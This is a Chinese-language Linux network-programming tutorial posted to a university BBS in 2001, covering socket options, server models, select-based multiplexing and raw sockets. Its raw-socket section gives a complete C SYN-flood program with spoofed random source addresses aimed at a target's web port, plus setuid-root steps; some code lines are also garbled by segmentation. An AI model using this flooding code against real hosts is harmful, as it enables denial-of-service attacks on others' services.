日月 光华   - -   Programming 精华区 文章 阅读 
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
   发信人 :   freshbird   ( 真 菜鸟 ~ 快乐 的 愚人 ) ,   信 区 :   Programming 
 标     题 :   学习 Linux 网络 编程 ( 4 )   
 发信站 :   日月 光华 站   ( Mon   Apr     2   16 : 55 : 47   2001 )   ,   站 内 信件 
 
 8 .   套 接字 选项 
 有时候 我们 要 控制 套 接字 的 行为 ( 如 修改 缓冲区 的 大小 ) , 这个 时候 我们 就要 控制 套 接字 的 
 选项 了 . 
 8.1   getsockopt 和 setsockopt 
 int   getsockopt ( int   sockfd , int   level , int   optname , void   * optval , socklen _ t   * optl 
 en ) 
 int   setsockopt ( int   sockfd , int   level , int   optname , const   void   * optval , socklen _ t 
   * optlen ) 
 level 指定 控制 套 接字 的 层次 . 可以 取 三种 值 :   1 ) SOL _ SOCKET : 通用 套 接字 选项 .   2 ) IPPRO 
 TO _ IP : IP 选项 .   3 ) IPPROTO _ TCP : TCP 选项 . 
 optname 指定 控制 的 方式 ( 选项 的 名称 ) , 我们 下面 详细 解释 
 optval 获得 或者 是 设置 套 接字 选项 . 根据 选项 名称 的 数据类型 进行 转换 
 选项 名称   说明   数据类型 
 = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
 SOL _ SOCKET 
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 SO _ BROADCAST   允许 发送 广播 数据   int 
 SO _ DEBUG   允许 调试   int 
 SO _ DONTROUTE   不 查找 路由   int 
 SO _ ERROR   获得 套 接字 错误   int 
 SO _ KEEPALIVE   保持 连接   int 
 SO _ LINGER   延迟 关闭 连接   struct   linger 
 SO _ OOBINLINE   带外 数据 放入 正常 数据流   int 
 SO _ RCVBUF   接收缓冲区 大小   int 
 SO _ SNDBUF   发送缓冲区 大小   int 
 SO _ RCVLOWAT   接收缓冲区 下限   int 
 SO _ SNDLOWAT   发送缓冲区 下限   int 
 SO _ RCVTIMEO   接收 超时   struct   timeval 
 SO _ SNDTIMEO   发送 超时   struct   timeval 
 SO _ REUSERADDR   允许 重用 本地 地址 和 端口   int 
 SO _ TYPE   获得 套 接字 类型   int 
 SO _ BSDCOMPAT   与 BSD 系统 兼容   int 
 = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
 IPPROTO _ IP 
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 IP _ HDRINCL   在 数据包 中 包含 IP 首部   int 
 IP _ OPTINOS   IP 首部 选项   int 
 IP _ TOS   服务类型 
 IP _ TTL   生存 时间   int 
 = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
 IPPRO _ TCP 
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 TCP _ MAXSEG   TCP 最大 数据 段 的 大小   int 
 TCP _ NODELAY   不 使用 Nagle 算法   int 
 = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
 关于 这些 选项 的 详细情况 请 查看   Linux   Programmers   Manual 
 8.2   ioctl 
 ioctl 可以 控制 所有 的 文件 描述符 的 情况 , 这里 介绍 一下 控制 套 接字 的 选项 . 
 int   ioctl ( int   fd , int   req , ... ) 
 = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
 ioctl 的 控制 选项 
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 SIOCATMARK   是否 到达 带外 标记   int 
 FIOASYNC   异步 输入 / 输出 标志   int 
 FIONREAD   缓冲区 可读 的 字节数   int 
 详细 的 选项 请 用   man   ioctl _ list   查看 . 
 9 .   服务器 模型 
 学习 过 《 软件工程 》 吧 . 软件工程 可是 每 一个 程序员 " 必修 " 的 课程 啊 . 如果 你 没有 学习 过 
 ,   建议 你 去 看一看 .   在 这 一章 里面 , 我们 一 起来 从 软件工程 的 角度 学习 网络 编程 的 思想 . 
 在 我们 写 程序 之前 ,   我们 都 应该 从 软件工程 的 角度 规划 好 我们 的 软件 , 这样 我们 开发软件 
 的 效率 才 会 高 .   在 网络 程序 里面 , 一般 的 来说 都 是 许多 客户机 对应 一个 服务器 . 为了 处理 
 客户机 的 请求 ,   对 服务端 的 程序 就 提出 了 特殊 的 要求 . 我们 学习 一下 目前 最 常用 的 服务器 
 模型 . 
 循环 服务器 : 循环 服务器 在 同一个 时刻 只 可以 响应 一个 客户端 的 请求 
 并发 服务器 : 并发 服务器 在 同一个 时刻 可以 响应 多个 客户端 的 请求 
 9.1   循环 服务器 : UDP 服务器 
 UDP 循环 服务器 的 实现 非常简单 : UDP 服务器 每次 从套 接字 上 读取 一个 客户端 的 请求 , 处理 
 ,   然后 将 结果 返回 给 客户机 . 
 可以 用 下面 的 算法 来 实现 . 
 socket ( ... ) ; 
 bind ( ... ) ; 
 while ( 1 ) 
 { 
 recvfrom ( ... ) ; 
 process ( ... ) ; 
 sendto ( ... ) ; 
 } 
 因为 UDP 是非 面向 连接 的 , 没有 一个 客户端 可以 老是 占 住 服务端 .   只要 处理过程 不是 死循 
 环 ,   服务器 对于 每 一个 客户机 的 请求 总是 能够 满足 . 
 9.2   循环 服务器 : TCP 服务器 
 TCP 循环 服务器 的 实现 也 不难 : TCP 服务器 接受 一个 客户端 的 连接 , 然后 处理 , 完成 了 这个 客 
 户 的 所有 请求 后 , 断开连接 . 
 算法 如下 : 
 socket ( ... ) ; 
 bind ( ... ) ; 
 listen ( ... ) ; 
 while ( 1 ) 
 { 
 accept ( ... ) ; 
 while ( 1 ) 
 { 
 read ( ... ) ; 
 process ( ... ) ; 
 write ( ... ) ; 
 } 
 close ( ... ) ; 
 } 
 TCP 循环 服务器 一次 只能 处理 一个 客户端 的 请求 . 只有 在 这个 客户 的 所有 请求 都 满足 后 , 
 服务器 才 可以 继续 后面 的 请求 . 这样 如果 有 一个 客户端 占 住 服务器 不放时 , 其它 的 客户机 
 都 不能 工作 了 . 因此 , TCP 服务器 一般 很少 用 循环 服务器 模型 的 . 
 9.3   并发 服务器 : TCP 服务器 
 为了 弥补 循环 TCP 服务器 的 缺陷 , 人们 又 想 出 了 并发 服务器 的 模型 .   并发 服务器 的 思想 是 
 每 一个 客户机 的 请求 并 不由 服务器 直接 处理 , 而是 服务器 创建 一个   子 进程 来 处理 . 
 算法 如下 : 
 socket ( ... ) ; 
 bind ( ... ) ; 
 listen ( ... ) ; 
 while ( 1 ) 
 { 
 accept ( ... ) ; 
 if ( fork ( .. ) = = 0 ) 
 { 
 while ( 1 ) 
 { 
 read ( ... ) ; 
 process ( ... ) ; 
 write ( ... ) ; 
 } 
 close ( ... ) ; 
 exit ( ... ) ; 
 } 
 close ( ... ) ; 
 } 
 TCP 并发 服务器 可以 解决 TCP 循环 服务器 客户机 独占 服务器 的 情况 .   不过 也 同时 带来 了 一 
 个 不小 的 问题 . 为了 响应 客户机 的 请求 , 服务器 要 创建 子 进程 来 处理 .   而 创建 子 进程 是 一 
 种 非常 消耗 资源 的 操作 . 
 9.4   并发 服务器 : 多路复用 I / O 
 为了 解决 创建 子 进程 带来 的 系统资源 消耗 , 人们 又 想 出 了 多路复用 I / O 模型 . 
 首先 介绍 一个 函数 select 
 int   select ( int   nfds , fd _ set   * readfds , fd _ set   * writefds , 
 fd _ set   * except   fds , struct   timeval   * timeout ) 
 void   FD _ SET ( int   fd , fd _ set   * fdset ) 
 void   FD _ CLR ( int   fd , fd _ set   * fdset ) 
 void   FD _ ZERO ( fd _ set   * fdset ) 
 int   FD _ ISSET ( int   fd , fd _ set   * fdset ) 
 一般 的 来说 当 我们 在 向 文件 读写 时 , 进程 有 可能 在 读写 出 阻塞 , 直到 一定 的 条件 满足 .   比 
 如 我们 从 一个套 接字 读数据 时 , 可能 缓冲区 里面 没有 数据 可 读 ( 通信 的 对方 还 没有   发送 数 
 据 过来 ) , 这个 时候 我们 的 读 调用 就 会 等待 ( 阻塞 ) 直到 有 数据 可读 . 如果 我们 不   希望 阻塞 
 , 我们 的 一个 选择 是 用 select 系统 调用 .   只要 我们 设置 好 select 的 各个 参数 , 那么 当 文件 
 可以 读写 的 时候 select 回 " 通知 " 我们   说 可以 读写 了 .   readfds 所有 要读 的 文件 文件 描述 
 符 的 集合 
 writefds 所有 要 的 写 文件 文件 描述符 的 集合 
 exceptfds 其他 的 服要 向 我们 通知 的 文件 描述符 
 timeout 超时 设置 . 
 nfds 所有 我们 监控 的 文件 描述符 中 最大 的 那 一个 加 1 
 在 我们 调用 select 时 进程 会 一直 阻塞 直到 以下 的 一种 情况 发生 .   1 ) 有 文件 可以 读 . 2 ) 有文 
 件 可以 写 . 3 ) 超时 所 设置 的 时间 到 . 
 为了 设置 文件 描述符 我们 要 使用 几个 宏 .   FD _ SET 将 fd 加入 到 fdset 
 FD _ CLR 将 fd 从 fdset 里面 清除 
 FD _ ZERO 从 fdset 中 清除 所有 的 文件 描述符 
 FD _ ISSET 判断 fd 是否 在 fdset 集合 中 
 使用 select 的 一个 例子 
 int   use _ select ( int   * readfd , int   n ) 
 { 
 fd _ set   my _ readfd ; 
 int   maxfd ; 
 int   i ; 
 maxfd = readfd [ 0 ] ; 
 for ( i = 1 ; i   if ( readfd [ i ] > maxfd )   maxfd = readfd [ i ] ; 
 while ( 1 ) 
 { 
 / *   将 所有 的 文件 描述符 加入   * / 
 FD _ ZERO ( & my _ readfd ) ; 
 for ( i = 0 ; i   FD _ SET ( readfd [ i ] , * my _ readfd ) ; 
 / *   进程 阻塞   * / 
 select ( maxfd + 1 , &   my _ readfd , NULL , NULL , NULL ) ; 
 / *   有 东西 可以 读 了   * / 
 for ( i = 0 ; i   if ( FD _ ISSET ( readfd [ i ] , & my _ readfd ) ) 
 { 
 / *   原来 是 我 可以 读 了   * / 
 we _ read ( readfd [ i ] ) ; 
 } 
 } 
 } 
 使用 select 后 我们 的 服务器程序 就 变成 了 . 
 初始 话 ( socket , bind , listen ) ; 
 while ( 1 ) 
 { 
 设置 监听 读写 文件 描述符 ( FD _ * ) ; 
 调用 select ; 
 如果 是 倾听 套 接字 就绪 , 说明 一个 新 的 连接 请求 建立 
 { 
 建立 连接 ( accept ) ; 
 加入 到 监听 文件 描述符 中 去 ; 
 } 
 否则 说明 是 一个 已经 连接 过 的 描述符 
 { 
 进行 操作 ( read 或者 write ) ; 
 } 
 } 
 多路复用 I / O 可以 解决 资源 限制 的 问题 . 着 模型 实际上 是 将 UDP 循环 模型 用 在 了 TCP 上面 . 
 这 也 就 带来 了 一些 问题 . 如 由于 服务器 依次 处理 客户 的 请求 , 所以 可能 会 导致 有 的 客户   会 
 等待 很久 . 
 9.5   并发 服务器 : UDP 服务器 
 人们 把 并发 的 概念 用于 UDP 就 得到 了 并发 UDP 服务器 模型 .   并发 UDP 服务器 模型 其实 是 简单 
 的 . 和 并发 的 TCP 服务器 模型 一样 是 创建 一个 子 进程 来 处理 的   算法 和 并发 的 TCP 模型 一样 
 . 
 除非 服务器 在 处理 客户端 的 请求 所用 的 时间 比较 长 以外 , 人们 实际上 很少 用 这种 模型 . 
 9.6   一个 并发 TCP 服务器 实例 
 # include 
 # include 
 # include 
 # include 
 # include 
 # define   MY _ PORT   8888 
 int   main ( int   argc   , char   * * argv ) 
 { 
 int   listen _ fd , accept _ fd ; 
 struct   sockaddr _ in   client _ addr ; 
 int   n ; 
 if ( ( listen _ fd = socket ( AF _ INET , SOCK _ STREAM , 0 ) ) < 0 ) 
 { 
 printf ( " Socket   Error : % s \ n \ a " , strerror ( errno ) ) ; 
 exit ( 1 ) ; 
 } 
 bzero ( & client _ addr , sizeof ( struct   sockaddr _ in ) ) ; 
 client _ addr . sin _ family = AF _ INET ; 
 client _ addr . sin _ port = htons ( MY _ PORT ) ; 
 client _ addr . sin _ addr . s _ addr = htonl ( INADDR _ ANY ) ; 
 n = 1 ; 
 / *   如果 服务器 终止 后 , 服务器 可以 第二次 快速 启动 而 不用 等待 一段时间   * / 
 setsockopt ( listen _ fd , SOL _ SOCKET , SO _ REUSEADDR , & n , sizeof ( int ) ) ; 
 if ( bind ( listen _ fd , ( struct   sockaddr   * ) & client _ addr , sizeof ( client _ addr ) ) < 0 ) 
 { 
 printf ( " Bind   Error : % s \ n \ a " , strerror ( errno ) ) ; 
 exit ( 1 ) ; 
 } 
 listen ( listen _ fd , 5 ) ; 
 while ( 1 ) 
 { 
 accept _ fd = accept ( listen _ fd , NULL , NULL ) ; 
 if ( ( accept _ fd < 0 ) && ( errno = = EINTR ) ) 
 continue ; 
 else   if ( accept _ fd < 0 ) 
 { 
 printf ( " Accept   Error : % s \ n \ a " , strerror ( errno ) ) ; 
 continue ; 
 } 
 if ( ( n = fork ( ) ) = = 0 ) 
 { 
 / *   子 进程 处理 客户端 的 连接   * / 
 char   buffer [ 1024 ] ; 
 close ( listen _ fd ) ; 
 n = read ( accept _ fd , buffer , 1024 ) ; 
 write ( accept _ fd , buffer , n ) ; 
 close ( accept _ fd ) ; 
 exit ( 0 ) ; 
 } 
 else   if ( n < 0 ) 
 printf ( " Fork   Error : % s \ n \ a " , strerror ( errno ) ) ; 
 close ( accept _ fd ) ; 
 } 
 } 
 你 可以 用 我们 前面 写 客户端程序 来 调试 着 程序 , 或者 是 用来 telnet 调试 
 10 .   原始 套 接字 
 我们 在 前面 已经 学习 过 了 网络 程序 的 两种 套 接字 ( SOCK _ STREAM , SOCK _ DRAGM ) . 在 这 一章 
 里面 我们 一 起来 学习 另外 一种 套 接字 - - 原始 套 接字 ( SOCK _ RAW ) .   应用 原始 套 接字 , 我们 可 
 以 编写出 由 TCP 和 UDP 套 接字 不 能够 实现 的 功能 .   注意 原始 套 接字 只 能够 由 有 root 权限 的 
 人 创建 . 
 10.1   原始 套 接字 的 创建 
 int   sockfd ( AF _ INET , SOCK _ RAW , protocol ) 
 可以 创建 一个 原始 套 接字 . 根据 协议 的 类型 不同 我们 可以 创建 不同 类型 的 原始 套 接字   比 
 如 : IPPROTO _ ICMP , IPPROTO _ TCP , IPPROTO _ UDP 等等 . 详细 的 情况 查看   下面 我们 以 一个 实例 
 来 说明 原始 套 接字 的 创建 和 使用 
 10.2   一个 原始 套 接字 的 实例 
 还 记得 DOS 是 什么 意思 吗 ? 在 这里 我们 就 一 起来 编写 一个 实现 DOS 的 小 程序 .   下面 是 程序 的 
 源代码 
 / * * * * * * * * * * * * * * * * * * * *   DOS . c   * * * * * * * * * * * * * * * * * / 
 # include 
 # include 
 # include 
 # include 
 # include 
 # include 
 # include 
 # include 
 # include 
 # define   DESTPORT   80   / *   要 攻击 的 端口 ( WEB )   * / 
 # define   LOCALPORT   8888 
 void   send _ tcp ( int   sockfd , struct   sockaddr _ in   * addr ) ; 
 unsigned   short   check _ sum ( unsigned   short   * addr , int   len ) ; 
 int   main ( int   argc , char   * * argv ) 
 { 
 int   sockfd ; 
 struct   sockaddr _ in   addr ; 
 struct   hostent   * host ; 
 int   on = 1 ; 
 if ( argc ! = 2 ) 
 { 
 fprintf ( stderr , " Usage : % s   hostname \ n \ a " , argv [ 0 ] ) ; 
 exit ( 1 ) ; 
 } 
 bzero ( & addr , sizeof ( struct   sockaddr _ in ) ) ; 
 addr . sin _ family = AF _ INET ; 
 addr . sin _ port = htons ( DESTPORT ) ; 
 if ( inet _ aton ( argv [ 1 ] , & addr . sin _ addr ) = = 0 ) 
 { 
 host = gethostbyname ( argv [ 1 ] ) ; 
 if ( host = = NULL ) 
 { 
 fprintf ( stderr , " HostName   Error : % s \ n \ a " , hstrerror ( h _ errno ) ) ; 
 exit ( 1 ) ; 
 } 
 addr . sin _ addr = * ( struct   in _ addr   * ) ( host - > h _ addr _ list [ 0 ] ) ; 
 } 
 / * * * *   使用 IPPROTO _ TCP 创建 一个 TCP 的 原始 套 接字   * * * * / 
 sockfd = socket ( AF _ INET , SOCK _ RAW , IPPROTO _ TCP ) ; 
 if ( sockfd < 0 ) 
 { 
 fprintf ( stderr , " Socket   Error : % s \ n \ a " , strerror ( errno ) ) ; 
 exit ( 1 ) ; 
 } 
 / * * * * * * * *   设置 IP 数据包 格式 , 告诉 系统 内核模块 IP 数据包 由 我们 自己 来 填写   * * * / 
 setsockopt ( sockfd , IPPROTO _ IP , IP _ HDRINCL , & on , sizeof ( on ) ) ; 
 / * * * *   没有 办法 , 只用 超级 护 用户 才 可以 使用 原始 套 接字   * * * * * * * * * / 
 setuid ( getpid ( ) ) ; 
 / * * * * * * * * *   发送 炸弹 了 ! ! ! !   * * * * / 
 send _ tcp ( sockfd , & addr ) ; 
 } 
 / * * * * * * *   发送 炸弹 的 实现   * * * * * * * * * / 
 void   send _ tcp ( int   sockfd , struct   sockaddr _ in   * addr ) 
 { 
 char   buffer [ 100 ] ;   / * * * *   用来 放置 我们 的 数据包   * * * * / 
 struct   ip   * ip ; 
 struct   tcphdr   * tcp ; 
 int   head _ len ; 
 / * * * * * * *   我们 的 数据包 实际上 没有 任何 内容 , 所以 长度 就是 两个 结构 的 长度   * * * / 
 head _ len = sizeof ( struct   ip ) + sizeof ( struct   tcphdr ) ; 
 bzero ( buffer , 100 ) ; 
 / * * * * * * * *   填充 IP 数据包 的 头部 , 还 记得 IP 的 头 格式 吗 ?   * * * * * * / 
 ip = ( struct   ip   * ) buffer ; 
 ip - > ip _ v = IPVERSION ;   / * *   版本 一般 的 是   4   * * / 
 ip - > ip _ hl = sizeof ( struct   ip ) > > 2 ;   / * *   IP 数据包 的 头部 长度   * * / 
 ip - > ip _ tos = 0 ;   / * *   服务类型   * * / 
 ip - > ip _ len = htons ( head _ len ) ;   / * *   IP 数据包 的 长度   * * / 
 ip - > ip _ id = 0 ;   / * *   让 系统 去 填写 吧   * * / 
 ip - > ip _ off = 0 ;   / * *   和 上面 一样 , 省 点 时间   * * / 
 ip - > ip _ ttl = MAXTTL ;   / * *   最长 的 时间   255   * * / 
 ip - > ip _ p = IPPROTO _ TCP ;   / * *   我们 要发 的 是   TCP 包   * * / 
 ip - > ip _ sum = 0 ;   / * *   校验 和 让 系统 去 做   * * / 
 ip - > ip _ dst = addr - > sin _ addr ;   / * *   我们 攻击 的 对象   * * / 
 / * * * * * * *   开始 填写 TCP 数据包   * * * * * / 
 tcp = ( struct   tcphdr   * ) ( buffer   + sizeof ( struct   ip ) ) ; 
 tcp - > source = htons ( LOCALPORT ) ; 
 tcp - > dest = addr - > sin _ port ;   / * *   目的 端口   * * / 
 tcp - > seq = random ( ) ; 
 tcp - > ack _ seq = 0 ; 
 tcp - > doff = 5 ; 
 tcp - > syn = 1 ;   / * *   我要 建立 连接   * * / 
 tcp - > check = 0 ; 
 / * *   好 了 , 一切 都 准备 好 了 . 服务器 , 你 准备 好 了 没有 ? ?   ^ _ ^   * * / 
 while ( 1 ) 
 { 
 / * *   你 不 知道 我 是从 那里 来 的 , 慢慢 的 去 等 吧 !   * * / 
 ip - > ip _ src . s _ addr = random ( ) ; 
 / * *   什么 都 让 系统 做 了 , 也 没有 多大 的 意思 , 还是 让 我们 自己 来 校验 头部 吧   * / 
 / * *   下面 这 条 可有可无   * / 
 tcp - > check = check _ sum ( ( unsigned   short   * ) tcp , 
 sizeof ( struct   tcphdr ) ) ; 
 sendto ( sockfd , buffer , head _ len , 0 , addr , sizeof ( struct   sockaddr _ in ) ) ; 
 } 
 } 
 / *   下面 是 首部 校验 和 的 算法 , 偷 了 别人 的   * / 
 unsigned   short   check _ sum ( unsigned   short   * addr , int   len ) 
 { 
 register   int   nleft = len ; 
 register   int   sum = 0 ; 
 register   short   * w = addr ; 
 short   answer = 0 ; 
 while ( nleft > 1 ) 
 { 
 sum + = * w ++ ; 
 nleft - = 2 ; 
 } 
 if ( nleft = = 1 ) 
 { 
 * ( unsigned   char   * ) ( & answer ) = * ( unsigned   char   * ) w ; 
 sum + = answer ; 
 } 
 sum = ( sum > > 16 ) + ( sum & 0xffff ) ; 
 sum + = ( sum > > 16 ) ; 
 answer = ~ sum ; 
 return ( answer ) ; 
 } 
 编译 一下 , 拿 localhost 做 一下 实验 , 看看 有 什么 结果 . ( 千万 不要 试 别人 的 啊 ) .   为了 让 普 
 通 用户 可以 运行 这个 程序 , 我们 应该 将 这个 程序 的 所有者 变为 root , 且   设置 setuid 位 
 [ root @ hoyt   / root ] # chown   root   DOS 
 [ root @ hoyt   / root ] # chmod   + s   DOS 
 10.3   总结 
 原始 套 接字 和 一般 的 套 接字 不同 的 是 以前 许多 由 系统 做 的 事情 , 现在 要 由 我们 自己 来 做 了 
 .   不过 这 里面 是不是 有 很多 的 乐趣 呢 .   当 我们 创建 了 一个 TCP 套 接字 的 时候 , 我们 只是 负 
 责把 我们 要 发送 的 内容 ( buffer ) 传递 给 了 系统 .   系统 在 收到 我们 的 数据 后 , 回 自动 的 调用 
 相应 的 模块 给 数据 加上 TCP 头部 , 然后 加上 IP 头部 .   再 发送 出去 . 而 现在 是 我们 自己 创建 各 
 个 的 头部 , 系统 只是 把 它们 发送 出去 .   在 上面 的 实例 中 , 由于 我们 要 修改 我们 的 源 IP地址 
 , 所以 我们 使用 了 setsockopt 函数 , 如果 我们 只是 修改 TCP 数据 , 那么 IP 数据 一样 也 可以 由 
 系统 来 创建 的 . 
 11 .   后记 
 总算 完成 了 网络 编程 这个 教程 . 算 起来 我 差不多 写 了 一个 星期 , 原来 以为 写 这个 应该 是 一 
 件   不难 的 事 , 做 起来 才 知道 原来 有 很多 的 地方 都 比 我 想象 的 要 难 . 我 还 把 很多 的 东西 都 省 
 略 掉 了   不过 写 完 了 这篇 教程 以后 , 我 好象 对 网络 的 认识 又 增加 了 一步 . 
 如果 我们 只是 编写 一般 的   网络 程序 还是 比较 容易 的 , 但是 如果 我们 想 写出 比较 好 的 网络 
 程序 我们 还有 着 遥远 的 路 要 走 .   网络 程序 一般 的 来说 都 是 多 进程 加上 多线程 的 . 为了 处理 
 好 他们 内部 的 关系 , 我们 还要 学习   进程 之间 的 通信 . 在 网络 程序 里面 有着 许许多多 的 突发 
 事件 , 为此 我们 还要 去 学习 更 高级 的   事件处理 知识 . 现在 的 信息 越来越 多 了 , 为了 处理 好 
 这些 信息 , 我们 还要 去 学习 数据库 .   如果 要 编写出 有用 的 黑客软件 , 我们 还要 去 熟悉 各种 
 网络协议 . 总之 我们 要学 的 东西 还 很多很多 . 
 看一看 外国 的 软件 水平 , 看一看 印度 的 软件 水平 , 宝岛 台湾 的 水平 , 再 看一看 我们 自己 的 
 软件 水平 大家 就 会 知道 了 什么 叫做 差距 . 我们 现在 用 的 软件 有 几个 是 我们 中国 人 自己 编写 
 的 . 
 不过 大家 不要 害怕 , 不用 担心 . 只要 我们 还是 清醒 的 , 还 能够 认清 我们 和 别人 的 差距 ,   我们 
 就 还有 希望 .   毕竟 我们 现在 还 年轻 . 只要 我们 努力 , 认真 的 去 学习 , 我们 一定 能够 学好 的 . 
 我们 就 可以 追 上 别人 直到 超过 别人 ! 
 相信 一点 : 
 别人 可以 做到 的 我们 一样 可以 做到 , 而且 可以 比 别人 做 的 更好 ! 
 勇敢 的 freshbird 和 你 的 mm , 为了 我们 伟大祖国 的 软件产业 , 为了 祖国 的 未来 , 努力 的 去 奋斗 吧 ! 祖国 会 
 记住 你们 的 !   
 
 - - 
 ※   来源 : ・ 日月 光华 站   bbs . fudan . edu . cn ・ [ FROM :   202.119 . 32.102 ] 
 
   
 
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 [ 返回 上 一页 ]   [ 本 讨论区 ]